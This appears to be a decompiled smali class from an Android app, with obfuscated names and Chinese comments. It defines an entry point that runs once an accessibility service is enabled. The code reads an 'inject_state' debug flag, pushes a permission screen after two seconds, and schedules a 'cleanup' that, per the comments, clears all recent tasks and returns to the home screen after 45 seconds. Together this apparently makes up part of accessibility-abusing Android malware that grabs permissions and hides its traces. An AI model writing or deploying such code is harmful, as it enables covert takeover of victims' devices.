.class public final Lڝږ؁ڋ/ڽ;
.super Ljava/lang/Object;

# 打开无障碍后的统一入口（调试模式）：
#   isDebug(ctx) → inject_state.debug_mode，默认 true
#   start(svc)   → 2 秒后拉起 PermissionActivity；45 秒后收尾清场（最近任务→全部清除→回桌面）

.method public static isDebug(Landroid/content/Context;)Z
    .locals 3
    :try_start_0
    const-string v0, "inject_state"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const-string v1, "debug_mode"
    const/4 v2, 0x1
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return v0
    :catch_0
    move-exception v0
    const/4 v0, 0x0
    return v0
.end method

.method public static start(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 5
    :try_start_0
    const-string v0, "MyAccessSvc"
    const-string v1, "debug flow: permission in 2s, cleanup in 45s"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    new-instance v1, Lڝږ؁ڋ/ٿ;
    invoke-direct {v1, p0}, Lڝږ؁ڋ/ٿ;-><init>(Landroid/content/Context;)V
    const-wide/16 v2, 0x7d0
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    const-wide/32 v2, 0xafc8
    invoke-static {p0, v2, v3}, Lڝږ؁ڋ/ڿ;->start(Landroid/accessibilityservice/AccessibilityService;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    const-string v1, "MyAccessSvc"
    const-string v2, "debug flow start failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method
